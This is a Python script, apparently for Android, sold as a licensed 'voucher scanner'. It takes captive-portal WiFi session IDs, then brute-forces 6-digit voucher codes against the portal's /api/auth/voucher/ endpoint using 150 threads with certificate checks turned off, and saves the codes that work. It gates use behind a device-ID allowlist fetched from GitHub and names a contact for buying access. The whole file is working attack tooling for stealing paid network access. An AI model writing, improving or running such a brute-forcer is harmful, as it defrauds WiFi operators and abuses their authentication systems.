import requests
import random
import string
import time
import os
import threading
import re
import sys
import urllib3
import json
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIGURATION
# ===============================
GITHUB_RAW_KEYS = "https://raw.githubusercontent.com/tmmt6132-coder/Lin/main/keys.txt"
LOCAL_KEYS_FILE = os.path.expanduser("~/.lin_scanner_auth.json")
SAVE_PATH = "/storage/emulated/0/zapya/lin_hits.txt"

# Colors (Modern Palette)
CYAN = "\033[1;36m"; GREEN = "\033[1;32m"; RED = "\033[1;31m"
YELLOW = "\033[1;33m"; WHITE = "\033[1;37m"; MAGENTA = "\033[1;35m"
RESET = "\033[0m"

# Globals
NUM_THREADS = 150             
SESSION_POOL_SIZE = 60        
session_pool = Queue()
valid_codes = []
tried_codes = set()
DETECTED_BASE_URL = None
TOTAL_TRIED = 0
TOTAL_HITS = 0
CURRENT_CODE = ""
START_TIME = time.time()
stop_event = threading.Event()

# ===============================
# AUTHENTICATION ENGINE
# ===============================

def get_sys_id():
    try:
        user = os.environ.get('USER', 'u0_a000')
        uid = os.getuid() if hasattr(os, 'getuid') else "1000"
        return f"{user}_{uid}"
    except: return "unknown_device"

def fetch_auth():
    auth_data = {}
    try:
        # Online Fetch
        res = requests.get(f"{GITHUB_RAW_KEYS}?t={time.time()}", timeout=10)
        if res.status_code == 200:
            for line in res.text.splitlines():
                parts = line.strip().split(':')
                if len(parts) >= 3:
                    auth_data[parts[-1].strip()] = parts[1].strip()
            with open(LOCAL_KEYS_FILE, 'w') as f: json.dump(auth_data, f)
            return auth_data, "CLOUD"
    except:
        # Offline Fetch
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                return json.load(f), "LOCAL"
    return auth_data, "ERROR"

def check_approval():
    os.system('clear')
    my_id = get_sys_id()
    print(f"{CYAN}┌────────────────────────────────────────────────────────┐{RESET}")
    print(f"{CYAN}│             L I N   P R O T E C T I O N                │{RESET}")
    print(f"{CYAN}└────────────────────────────────────────────────────────┘{RESET}")
    print(f" [>] IDENTIFIER: {WHITE}{my_id}{RESET}")
    
    data, mode = fetch_auth()
    if my_id in data:
        try:
            exp = datetime.strptime(data[my_id], "%Y-%m-%d")
            if datetime.now() < exp:
                print(f" [>] STATUS    : {GREEN}AUTHORIZED ({mode}){RESET}")
                print(f" [>] VALID UNTIL: {YELLOW}{data[my_id]}{RESET}")
                time.sleep(1.5)
                return True
            else: print(f" [>] STATUS    : {RED}EXPIRED{RESET}")
        except: print(f" [>] STATUS    : {RED}DATABASE ERROR{RESET}")
    else: print(f" [>] STATUS    : {RED}UNAUTHORIZED ACCESS{RESET}")
    
    print(f"\n {MAGENTA}CONTACT ADMIN: @Kenobe21{RESET}")
    return False

# ===============================
# UI COMPONENTS
# ===============================

def lin_banner():
    os.system('clear')
    print(f"{MAGENTA}    __    _____   __{RESET}")
    print(f"{MAGENTA}   / /   /  _/ | / /{RESET}")
    print(f"{MAGENTA}  / /    / //  |/ / {RESET}  {WHITE}ULTRA FAST VOUCHER SCANNER{RESET}")
    print(f"{MAGENTA} / /____/ // /|  /  {RESET}  {CYAN}ENGINE VERSION: 8.0{RESET}")
    print(f"{MAGENTA}/_____/___/_/ |_/   {RESET}  {YELLOW}BY LIN DEVELOPER{RESET}")
    print(f"{CYAN}────────────────────────────────────────────────────────────{RESET}")

def live_dashboard():
    while not stop_event.is_set():
        lin_banner()
        elapsed = time.time() - START_TIME
        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
        print(f" {WHITE}TOTAL ATTEMPTS {RESET}: {CYAN}{TOTAL_TRIED:,}{RESET}")
        print(f" {WHITE}SUCCESS HITS   {RESET}: {GREEN}{TOTAL_HITS}{RESET}")
        print(f" {WHITE}SPEED          {RESET}: {YELLOW}{speed:.1f} req/s{RESET}")
        print(f" {WHITE}CURRENT CODE   {RESET}: {MAGENTA}[ {CURRENT_CODE} ]{RESET}")
        print(f"{CYAN}────────────────────────────────────────────────────────────{RESET}")
        print(f" {WHITE}RECENT SUCCESS:{RESET}")
        for hit in valid_codes[-3:]:
            print(f" {GREEN}>> SUCCESS: {hit}{RESET}")
        print(f"{CYAN}────────────────────────────────────────────────────────────{RESET}")
        print(f" {RED}(PRESS CTRL+C TO STOP SCANNER){RESET}")
        time.sleep(1)

# ===============================
# CORE ENGINE
# ===============================

def get_sid():
    global DETECTED_BASE_URL
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        parsed = urlparse(r.url)
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        return parse_qs(parsed.query).get('sessionId', [None])[0]
    except: return None

def worker():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    session = requests.Session()
    while not stop_event.is_set():
        if not DETECTED_BASE_URL: time.sleep(1); continue
        try:
            slot = session_pool.get(timeout=2)
            sid = slot['sessionId']
            code = ''.join(random.choices(string.digits, k=6))
            CURRENT_CODE = code
            
            res = session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                             json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                             timeout=6, verify=False)
            TOTAL_TRIED += 1
            
            if "true" in res.text.lower():
                valid_codes.append(code)
                TOTAL_HITS += 1
                with open(SAVE_PATH, "a") as f:
                    f.write(f"{datetime.now().strftime('%H:%M')} | {code}\n")
            
            slot['left'] -= 1
            if slot['left'] > 0: session_pool.put(slot)
        except: pass

def start_engine():
    global START_TIME
    START_TIME = time.time()
    threading.Thread(target=live_dashboard, daemon=True).start()
    # Fill sessions
    for _ in range(SESSION_POOL_SIZE):
        sid = get_sid()
        if sid: session_pool.put({'sessionId': sid, 'left': 200})
    # Start workers
    for _ in range(NUM_THREADS):
        threading.Thread(target=worker, daemon=True).start()
    
    try:
        while not stop_event.is_set(): time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}[!] TERMINATING LIN ENGINE...{RESET}")

if __name__ == "__main__":
    if check_approval():
        lin_banner()
        print(f"\n {WHITE}[1] START 6-DIGIT SCAN")
        print(f" [2] START 7-DIGIT SCAN")
        print(f" [3] EXIT")
        opt = input(f"\n {CYAN}SELECT> {RESET}")
        if opt == "1": start_engine()
        else: sys.exit()
  
